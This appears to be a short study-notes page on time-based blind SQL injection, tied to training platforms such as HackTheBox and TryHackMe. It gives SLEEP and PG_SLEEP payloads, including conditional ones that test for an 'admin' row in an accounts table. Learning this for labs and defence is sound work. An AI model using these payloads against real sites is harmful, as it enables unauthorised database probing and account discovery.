# Time-based SQLi

[![sqlinjectionfundamentals](../../../../../_badges/htb/sqlinjectionfundamentals.svg)](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals)
[![sqlinjectionlm](../../../../../_badges/thm/sqlinjectionlm.svg)](https://tryhackme.com/room/sqlinjectionlm)
[![sqlilab](../../../../../_badges/thm/sqlilab.svg)](https://tryhackme.com/room/sqlilab)
[![sql_injection_time_based](../../../../../_badges/rootme/web_server/sql_injection_time_based.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based)

<div class="row row-cols-lg-2"><div>

A time-based SQLi is when we internationally delay the response from the database based on the condition.

For instance, given the condition "if the DBMS is MariaDB, wait 5 seconds", assuming the usual requests takes 1 second, if the sleep request takes ~6 seconds, then will know that the DBMS is MariaDB.

```sql!
1337=(SELECT 1337 FROM SLEEP(5))
1337=(SELECT 1337 FROM PG_SLEEP(5))
```
</div><div>

The select is ONLY called if there is at least one record selected, meaning the condition in the where is at least true for one record.

```sql!
[...] AND 1337=(Select SLEEP(5) from accounts where username='admin')
[...] AND IF('admin'in(SELECT username from accounts),SLEEP(5),0)
```
</div></div>